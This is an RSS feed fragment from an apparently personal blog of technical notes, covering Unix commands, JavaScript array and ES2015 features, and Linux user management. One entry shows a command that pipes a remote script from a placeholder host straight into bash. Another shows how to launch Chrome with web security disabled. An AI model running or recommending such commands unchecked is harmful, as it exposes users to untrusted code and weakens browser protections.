The pushd and popd commands put directory paths onto a directory stack (pushd) and then pop them off again (popd). Using the pushd and popd commands is not unlike dropping directory &#34;bread crumbs&#34; and then returning in reverse order to all the places you visited.</description>
    </item>
    
    <item>
      <title>Unix: Pranks that sysadmins play</title>
      <link>/post/_linux/2014-05-21-unix-pranks-that-sysadmins-play/</link>
      <pubDate>Wed, 21 May 2014 15:32:18 +0500</pubDate>
      
      <guid>/post/_linux/2014-05-21-unix-pranks-that-sysadmins-play/</guid>
      <description>Unix: Pranks that sysadmins play
Unix systems administrators tend to be very serious about their responsibilities -- except when they&#39;re not. And, when they&#39;re not, the pranks that they play on each other and some of their more annoying users might surprise you.</description>
    </item>
    
    <item>
      <title>a tmux crash course</title>
      <link>/post/_rsc/2014-05-21-a-tmux-crash-course/</link>
      <pubDate>Wed, 21 May 2014 15:23:43 +0500</pubDate>
      
      <guid>/post/_rsc/2014-05-21-a-tmux-crash-course/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Reboot does not fix anything, it just hides things.</title>
      <link>/post/_quotes/2014-05-21-quote-reboot-does-not-fix-anything-it-just-hides-things/</link>
      <pubDate>Wed, 21 May 2014 15:21:24 +0500</pubDate>
      
      <guid>/post/_quotes/2014-05-21-quote-reboot-does-not-fix-anything-it-just-hides-things/</guid>
      <description> Reboot does not fix anything, it just hides things.
 </description>
    </item>
    
    <item>
      <title>Anything you are going to do more than three times. Script it.</title>
      <link>/post/_quotes/2014-05-21-quote-anything-you-are-going-to-do-more-than-three-times-script-it/</link>
      <pubDate>Wed, 21 May 2014 15:19:02 +0500</pubDate>
      
      <guid>/post/_quotes/2014-05-21-quote-anything-you-are-going-to-do-more-than-three-times-script-it/</guid>
      <description> Anything you are going to do more than three times. Script it.
 </description>
    </item>
    
    <item>
      <title>(Hu)go Template Primer</title>
      <link>/post/go/goisforlovers/</link>
      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>/post/go/goisforlovers/</guid>
      <description>Hugo uses the excellent go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in go templates.
This document is a brief primer on using go templates.</description>
    </item>
    
    <item>
      <title>Getting Started with Hugo</title>
      <link>/post/hugoisforlovers/</link>
      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>/post/hugoisforlovers/</guid>
      <description>Step 1. Install Hugo Goto hugo releases and download the appropriate version for your os and architecture.
Save it somewhere specific as we will be using it in the next step.
More complete instructions are available at installing hugo
Step 2. Build the Docs Hugo has its own example site which happens to also be the documentation site you are reading right now.
Follow the following steps:
 Clone the hugo repository Go into the repo Run hugo in server mode and build the docs Open your browser to http://localhost:1313  Corresponding pseudo commands:</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/change-terminal-editor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/change-terminal-editor/</guid>
      <description>export EDITOR=nano OR
echo export EDITOR=nano &amp;gt;&amp;gt; /etc/profile  OR
EDITOR=nano  Don&amp;rsquo;t foreget to source ~/.bash_profile or exec bash for the change to take effect.
Source</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/twitchinstallarchlinux---chat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/twitchinstallarchlinux---chat/</guid>
      <description>I used nmap to track packets and log them into a db. then i made a little program to visualize it with colors
vitimiti: I want to run loadkeys de 7:26hitlurcat: somebody should switch the region to Russia and install myBB 7:26vitimiti: Just to piss people off 7:26HMage: Vitimiti now that&amp;rsquo;s evil 7:26vitimiti: Yes XDjackieXD: @Vitimiti this would screw up the chat input system 7:26HMage: I applaud you :D 7:27vitimiti: I was thinking about loadkeys es but Spanish keyboard is around many countries 7:27HMage: loadkeys ru</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/vim-basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/vim-basics/</guid>
      <description>Vim Basics Save file and exit in Vim To go to insert mode: i To save: [Esc] and zz To quit: [Esc] and :wq
Common Vi / Vim File Savings Related Commands (ex mode) You need to press [Esc] key followed by the colon (:) before typing the following commands:
q Quit
q! Quit without saving changes i.e. discard changes
r fileName Read data from file called fileName
wq Write and quit (save and exit)</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/curl-run-a-script-remotely-from-the-web/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/curl-run-a-script-remotely-from-the-web/</guid>
      <description>curl -s http://scriptLocation.com | bash -s
bash -s flag takes stdin
You can also do:
curl -s http://scriptLocation.com | sh -s  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/dig-domain-information-groper/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/dig-domain-information-groper/</guid>
      <description>Getting domain record details (NS, MX, TXT, SOA, SPF, A, AAAA, any) By default, dig only provides you wih an A record, i.e. an IP. To get details about a specific record, you need to pass it as an option with dig, like so:
dig NS aamnah.com dig aamnah.com NS dig MX aamnah.com  dig NS aamnah.com is the same as dig aamnah.com NS. It doesn&amp;rsquo;t matter if you pass the option in the beginnnig or at the end.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/du-disk-space-usage/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/du-disk-space-usage/</guid>
      <description>check space consumed and list by size:
du --max-depth=1 | sort -n | awk &#39;BEGIN {OFMT = &amp;quot;%.0f&amp;quot;} {print $1/1024,&amp;quot;MB&amp;quot;, $2}&#39;  explainshell
Example:
[root@server7 /]# du --max-depth=1 | sort -n | awk &#39;BEGIN {OFMT = &amp;quot;%.0f&amp;quot;} {print $1/1024,&amp;quot;MB&amp;quot;, $2}&#39; du: cannot access `./proc/18566/task/18566/fd/4&#39;: No such file or directory du: cannot access `./proc/18566/task/18566/fdinfo/4&#39;: No such file or directory du: cannot access `./proc/18566/fd/4&#39;: No such file or directory du: cannot access `.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/lsusb-list-usb-devices-on-linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/lsusb-list-usb-devices-on-linux/</guid>
      <description>List USB devices
lsusb  The Mac equivalent 1 is
system_profiler SPUSBDataType  For a visual alternative, the steps are:
 click the apple in the top left corner choose About This Mac click on the More Info… button to access the System Information application click on the System Report… button under Hardware group, there’s the USB option that we were searching for  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/scp-sftp-transferring-files-between-systems/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/scp-sftp-transferring-files-between-systems/</guid>
      <description>scp: Secure Copy scp fileName user@remoteServer:Location  [scp] Secure Copy for more on scp
SFTP: Secure FTP By default, if we have openssh installed, we can use sftp.
Connect to a remote machine:
sftp user@remoteServer  Once you have connected to a remote systems, you can copy files using put
For example:
sftp&amp;gt; put myFile  will put myFile on your local machine to the machine you are connected to.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/sort-sort/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/sort-sort/</guid>
      <description>-f, &amp;ndash;ignore-case</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/cut/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/cut/</guid>
      <description>cuts prints selected parts of a file.
-d, delimiter -f, field Example grab all the usernames in /etc/passwd
cut -f1 -d: /etc/passwd  where field f1 is the first occurance before delimiter :. Since the first occurance is the username, the command above will grab all the usernames.
cut -f7 -d: /etc/passwd  Field 7 is the last part in /etc/passwd, i.e, the shell associated with each account.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_commands/enable-cross-site-scripting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/enable-cross-site-scripting/</guid>
      <description>Quit Chrome and all of it&amp;rsquo;s processes. Open the browser via the Terminal using the following command.
Mac open -a Google\ Chrome --args --disable-web-security  #Linux
google-chrome --disable-web-security  Also if you&amp;rsquo;re trying to access local files for dev purposes like AJAX or JSON, you can use this flag too.
-–allow-file-access-from-files  Windows For Windows go into the command prompt and go into the folder where Chrome.exe is and type</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_ios-swift/cocoapods/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_ios-swift/cocoapods/</guid>
      <description>CocoaPods CocoaPods is a dependency manager for Swift and Objective-C Cocoa projects. Kinda like what npm is for Node.js and what Composer is for PHP.
tl;dr sudo gem install cocoapods cd project-dir pod init # edit the Podfile pod install # open the .xcworkspace file and get to work  install
sudo gem install cocoapods  pod setup --verbose  create an Xcode project, save it, exit Xcode.
Now open Terminal, cd into the directory of your project, and run</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/api-localstorage/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/api-localstorage/</guid>
      <description>Local and Session Storage There are two types of storage
 Local storage Session storage  Local storage let&amp;rsquo;s you save up to 5mb of data. That data can be accessed by any other page on the same site. That data lasts between visits and even after the browser is closed
Local vs. Session storage Local storage items persist even when you restart the browser whereas session storage items are cleared when you quit the browser.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-concat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-concat/</guid>
      <description>.concat() .concat() takes an existing array, adds a value to it and returns a new array
it takes a copy of the original array, adds to it any parameters passed and returns a new array.
.concat() is the equivalent of .push(), but superior, because it does not edit the data in place, it gives a new array as a result.
 you can pass in multiple values you can pass in different types you can pass in other arrays as params.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-every/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-every/</guid>
      <description>.every() The every() method return true/false based on whether or not every element in the source array passes a certain condition or not
You&amp;rsquo;ll exit on the first failure. If the condition returns false for something, it stop processing the array there and returns.
Examples // EXAMPLE 1 const items = [ 1, 2, 3, 4, 5, 6, 7, 8, 9 ] const result = items.every(x =&amp;gt; x &amp;lt; 10) // check every item is &amp;lt;10?</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-filter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-filter/</guid>
      <description>.filter() gives a new array after filtering an array based on the truth/false of a condition
Examples 1. get expensive stocks Here&amp;rsquo;s an array of stocks.
let stocks = [ { symbol: &amp;quot;APL&amp;quot;, price: 693 }, { symbol: &amp;quot;HUBC&amp;quot;, price: 103 }, { symbol: &amp;quot;POL&amp;quot;, price: 413 } ]  We&amp;rsquo;ll get the expensive stocks (let&amp;rsquo;s say the ones which cost more than 150) out of it with filter()</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-foreach/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-foreach/</guid>
      <description>.forEach() The forEach() array method accomplishes the same thing as regular for loops, but it does it asynchronously and in a simpler/easier way.
We have a stocks array, from which we just want the stock symbols.
let stocks = [ { symbol: &amp;quot;APL&amp;quot;, price: 693 }, { symbol: &amp;quot;HUBC&amp;quot;, price: 103 }, { symbol: &amp;quot;POL&amp;quot;, price: 413 } ]  Here&amp;rsquo;s how you&amp;rsquo;d do it using a regular for loop.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-map/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-map/</guid>
      <description>.map() transforms an array by performing a function on every item in the array, and returns a new array.
 async: can work on data that arrives async over time returns: A new array with each element being the result of the callback function.  We like working with map() because it works on data arriving asynchronously, unlike for loops where you can only work on synchronous data stored locally.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/array-reduce/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/array-reduce/</guid>
      <description>.reduce()  The reduce() method applies a function against an accumulator and each value of the array (from left-to-right) to reduce it to a single value. MDN
  The reduce() method reduces the array to a single value. The reduce() method executes a provided function for each value of the array (from left-to-right). The return value of the function is stored in an accumulator (result/total). Note: reduce() does not execute the function for array elements without values.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-arrow-functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-arrow-functions/</guid>
      <description>Arrow Functions Arrow functions are anonymous function expressions. They don&amp;rsquo;t show up in stack traces.
Pros  Shorter syntax. You get to remove function, return and some {..} Shines with this keyword. The arrow function doesn&amp;rsquo;t have it&amp;rsquo;s own this so we automatically get a lexical this (bind to the outer context). Skipping .bind(this)   Cons  Show up as anonymous in stack trace, makes debugging/troubleshooting hard. Imagine minified code, error at line 1, character 32712.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-async-await/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-async-await/</guid>
      <description>Async/Await Functions declare an async function that will allow us to wait for other functions. we can only await inside an async function, and we can only await a promise.
Async/await is an ES2016 (ES7) feature, so you&amp;rsquo;ll need a transpiler. See http://babeljs.io/docs/plugins/preset-latest/
npm i -g babel-cli  add a minimal .babelrc inside your project dir
{ &amp;quot;presets&amp;quot;: [ &amp;quot;latest&amp;quot; ] }  and install packages (locally, inside your project folder)</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-classes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-classes/</guid>
      <description>ES2015 / ES6 Classes in JavaScript Classes in JS don&amp;rsquo;t give JS an OO nature, JS remains Prototypal. Classes introduced in ES6 are mainly syntax sugar.
&amp;quot;use strict&amp;quot;; // CLASS class User{ // Constructor // takes any values/attr you want to set constructor(username, email, password) { this.username = username // Whatever username we passed in is now this Class&#39;s (instance) username this.email = email this.password = password } static countUsers () { console.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-default-vlaues/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-default-vlaues/</guid>
      <description>Default Values Here&amp;rsquo;s how we usde to do default parameter values before.. Say we have a function that returns 42 is no parameter value is provided and if a value is passed, it returns the value.
function foo (x) { x = x || 42 // Using the OR operand `||` to give 42 if x is false return x } foo(3) // 3 foo(99) // 99 foo(0) // 42 eh?</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-generators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-generators/</guid>
      <description>Generators Generators are functions that can be paused and resumed later. A generator can contain multiple yield statements. At each yield, the generator will pause.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-map/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-map/</guid>
      <description>Map  The Map object is a simple key/value map. Any value (both objects and primitive values) may be used as either a key or a value.
 You set and get values to/from a Map.
&#39;use strict&#39;; let classroom = new Map(); let stevenJ = { name: &#39;Steven&#39;, age: 22 }, sarah = { name: &#39;Sarah&#39;, age: 23 }, stevenS = { name: &#39;Steven&#39;, age: 22 }; classroom.set(&#39;stevenJ&#39;, stevenJ) classroom.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-overview/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-overview/</guid>
      <description>ES6 Features (ES2015) Arrow Function Syntax  MDN: Arrow Function Syntax Babel Docs Treehouse: Arrow Function Syntax YouTube: Arrow Function Syntax  Arrow function syntax is supported in all major browsers.
// Function Declaration function divide1(a,b) { return a/b; } // Function Expression const divide2 = function(a,b) { return a/b; } // Arrow Function Expression const divide3 = (a,b) =&amp;gt; { return a/b; } // Arrow Function Concise const divide4 = (a,b) =&amp;gt; a/b;  Arrow (aka lambda) functions define the function to the instance of wherever it was created (or something like that, requires citation).</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-promises/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-promises/</guid>
      <description>Promises Promises are like callback functions, but so much better. Promises are meant to save you from callback hell.
ES6 feature, started out as libraries. Natively supported in all modern browsers.
A promise is a pattern for handling asynchronous operations. The promise allows you to call a method called &amp;ldquo;then&amp;rdquo; that lets you specify the function(s) to use as the callbacks.
A promise is an eventual value.
three states</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-set/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-set/</guid>
      <description>Set https://teamtreehouse.com/library/set https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Set A Set is not an Array but it can behave like one. It’s a collection of unique values.
 The Set object lets you store unique values of any type, whether primitive values or object references.
 let showroom = new Set() let Prius = {make: &#39;Toyota&#39;, model: &#39;Prius 2017&#39;}, Civic = {make: &#39;Honda&#39;, model: &#39;Civic 2016&#39;}, A6 = { make: &#39;Audi&#39;, model: &#39;A6 Sedan 2017&#39;} showroom.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/es2015/es2015-var-let-const/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/es2015/es2015-var-let-const/</guid>
      <description>var, let and const  using var is an issue because var is hoisted. var is function scope, let is block scope. let is the new var. const is a constant. it is for something that is only going to be defined once. You can not redefine const. const is not exactly immutable, the values in const can sometimes be changed, for example if it&amp;rsquo;s an object and you want to chaneg property values inside, you can.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-array-methods/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-array-methods/</guid>
      <description>.map = iterate over arrays .reduce = Condense arrays .filter .sort .reverse .concat .split &amp;gt;&amp;gt; STRING method .join .slice() = slices array by taking indices .splice() = slice(), but modifies the original array .substr() .substring()
.forEach() forEach() is an async method (while normal for loops aren&amp;rsquo;t).
.map() iterates over every element of the array, creating a new array with values that have been modified by the callback function , and returns.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-arrays/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-arrays/</guid>
      <description>Arrays  get first item in an array: array[0]
 get last item in an array: array[array.length-1] add item to end: array.push(val) can push multiple values add item to beginning: array.unshift(val) remove item from end: array.pop() returns the last item from an array and removes it remove item from start: array.shift() returns the first item from an array and removes it Join elements in an array: .join()
 Join two Arrays: .</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-babel/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-babel/</guid>
      <description>Babel Babel is a transpiler that let&amp;rsquo;s you use the JS features of tomorrow, in your applications today. WHY you&amp;rsquo;d compile? Well, compatabilty for one. You can write code is ES6 and convert it to ES5 (which is fully supported by all browsers).
Transpiling is taking one language and converting it to another. If you have used SASS, you have transpiled SASS code to CSS. Similar with CoffeeScript to generate JS.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-basics-notes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-basics-notes/</guid>
      <description>JS Notes 7 JS Data Types:
 undefined null boolean string symbol number = numeric data object  If you do a mathematical operation on an undefined variable your result will be NaN which means Not a Number. If you concatenate a string with an undefined variable, you will get a literal string of undefined.
Compound Assignment With Augmented Multiplication is just *=
   Code Output     \&#39; single quote   \&amp;quot; double quote   \\ backslash   \n newline   \r carriage return   \t tab   \b backspace   \f form feed    Arrays [] [&#39; &#39;] is an empty array, { } is not.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-clousres/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-clousres/</guid>
      <description>Closures FunFunFunction In JavaScript, functions are not just functions, they are also closures. ALL functions are closures. What that means is that the function body has access to variables that are defined outside the function.
let me = &#39;Bruce Wayne&#39; function greetMe() { console.log(`Hello, ${me}!`) } greetMe()  We can do this in JS, call the function without passing it an argument. But apparently, we can&amp;rsquo;t do this in other languages (which don&amp;rsquo;t have support for closures).</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-composition/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-composition/</guid>
      <description> Functional Composition Functional composition - the art of taking one function and applying it to the result of another.
Function composition is the process of combining two or more functions to produce a new function. Composing functions together is like snapping together a series of pipes for our data to flow through.
 Master the JavaScript Interview: What is Function Composition? By Eric Elliot  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-conditionals/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-conditionals/</guid>
      <description>JS Conditionals Switch ONLY use the following ternary operator and short circuit evaluation in simple use cases where it is obvious what your code is doing
Ternary Operator This operator is frequently used as a shortcut for the if statement.
&amp;lt;boolean&amp;gt; ? &amp;lt;expression if true&amp;gt; : &amp;lt;expression if false&amp;gt;  condition ? expr1 : expr2  Note that you can not use return statements in ternary operators. The conditional operator requires expressions, not statements.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-filter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-filter/</guid>
      <description>.filter() Here is an animals array:
const animals = [ { name: &amp;quot;Fluffykins&amp;quot;, species: &amp;quot;rabbit&amp;quot;}, { name: &amp;quot;Caro&amp;quot;, species: &amp;quot;dog&amp;quot;}, { name: &amp;quot;Hamilton&amp;quot;, species: &amp;quot;dog&amp;quot;}, { name: &amp;quot;Harold&amp;quot;, species: &amp;quot;fish&amp;quot;}, { name: &amp;quot;Ursula&amp;quot;, species: &amp;quot;cat&amp;quot;}, { name: &amp;quot;Jimmy&amp;quot;, species: &amp;quot;fish&amp;quot;} ]  Here&amp;rsquo;s how you&amp;rsquo;d traditionally get all the dogs from the array:
const dogs = [] for (let i = 0; i &amp;lt; animals.length; i++) { if (animals.species === &#39;dog&#39;) { dogs.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-loops/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-loops/</guid>
      <description>Loops while loop runs while a condition is true (infinitely), for loop runs a certain number of times. To stop while loops you can use a break statement. (Or you need a statement that at some time evaluates to false so the loop could end). To keep track of how many times a loop has run, you start with a counter variable at 0 and increment it every time the loop runs.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-oop/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-oop/</guid>
      <description>Contructor functions A constructor function is given a Capitalized name to make it clear that it is a constructor
var Car = function() { this.wheels = 4; this.engines = 1; this.seats = 5; };  To use a constructor function we call it with the new keyword in front of it like:
var myCar = new Car()  To modify the properties of the new Car instance that you just created:</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-pure-functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-pure-functions/</guid>
      <description>Pure Functions  Video: Pure Functions, Props, and Nesting React Components in React Master the JavaScript Interview: What is a Pure Function?
 Pure functions always return the same result given the same arguments.
 Pure function&amp;rsquo;s execution doesn&amp;rsquo;t depend on the state of the application.
 Pure functions don&amp;rsquo;t modify the variables outside of their scope.
  Examples .slice() vs. .splice()
slice is a pure function. it doesn&amp;rsquo;t modify the array, it returns a shallow copy of the modified array.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-recursion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-recursion/</guid>
      <description> Recursion When a fnuction calls itself until it doesn&amp;rsquo;t. Duh!
let countDownFrom = num =&amp;gt; { if (num === 0) return countDownFrom(num -1) } countDownFrom(10)  Links  YouTube: FunFunFunction: Recursion - Part 7 of Functional Programming in JavaScript  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/js-state/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/js-state/</guid>
      <description>State wtf?
http://www.dofactory.com/javascript/state-design-pattern</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/modules/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/modules/</guid>
      <description> Why?  to avoid cluttering the global namespace  self-executing anonymous function !function() { function foo() { // blah }; foo(); }();  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/sorting-arrays-js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/sorting-arrays-js/</guid>
      <description>The method for sorting arrays is called.. sort!.
Examples Default sort
var fruit = [&#39;cherries&#39;, &#39;apples&#39;, &#39;bananas&#39;]; fruit.sort(); // [&#39;apples&#39;, &#39;bananas&#39;, &#39;cherries&#39;] var scores = [1, 10, 21, 2]; scores.sort(); // [1, 10, 2, 21] // Watch out that 10 comes before 2, // because &#39;10&#39; comes before &#39;2&#39; in Unicode code point order. var things = [&#39;word&#39;, &#39;Word&#39;, &#39;1 Word&#39;, &#39;2 Words&#39;]; things.sort(); // [&#39;1 Word&#39;, &#39;2 Words&#39;, &#39;Word&#39;, &#39;word&#39;] // In Unicode, numbers come before upper case letters, // which come before lower case letters.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/bind/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/bind/</guid>
      <description>bind  bind creates a new function and sets it&amp;rsquo;s scope.
 We use .bind() to create a new function and then set it&amp;rsquo;s scope to be bound to whatever was passed to bind.
this code
var myObj = { specialFunction: function () { }, anotherSpecialFunction: function () { }, getAsyncData: function (cb) { cb(); }, render: function () { var that = this; this.getAsyncData(function () { that.specialFunction(); that.anotherSpecialFunction(); }); } }; myObj.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/immutale.js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/immutale.js/</guid>
      <description>Intro to Immutable.js TIP: When using console.log while debugging Immutable.js objects, you&amp;rsquo;ll see weird Map structures and it doesn&amp;rsquo;t help very much in terms of figurring out object structure. For easier debugging, you can perform .toJS() on an Immutable object and console.log that to see the object structure in plain JS.
console.log(myMap) // console shows weird Immutable.js object console.log(myMap.toJS()) // console shows plain JS object  const Immutable = require(&#39;immutable&#39;) // Maps are like JS Objects var map1 = Immutable.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/this/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/this/</guid>
      <description>this Depending on where and how a function is called, this can mean different things. this is all about the context.
this is the owner of the function, i.e. the object where the method is called.
this is used a lot in clousres where functions have independant variables defined in an enclosing scope.
this is the strangest thing you&amp;rsquo;ll come across in JS, but just remember that it is the object that owns the method being called.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_javascript/use-strict/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/use-strict/</guid>
      <description>Use strict  Runs the JS interpreter in a strict mode, meaning it fails loudly for bad practices in JS Strict mode also eliminates silent errors. When something pretty major is going wrong, you won&amp;rsquo;t have to hunt for it. If you&amp;rsquo;re writing good code, &#39;use strict&#39; shouldn&amp;rsquo;t cause you any problems Part of ES5, official JS standard Goes on top your code, must be the first line in your file.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/basic-user-management/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/basic-user-management/</guid>
      <description>Basic User Management whoami = check which user are you su = switch to Super User passwd = change password
Change password passwd  will prompt to change the password for the current user
passwd john  will prompt to chnage the password for user &amp;lsquo;john&amp;rsquo;.
Add User useradd james  will add a user called &amp;lsquo;james&amp;rsquo;. Adding user requires sudo priveleges.
Remove a user You have a couple of options:</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/configuring-wifi-via-command-line/</link>
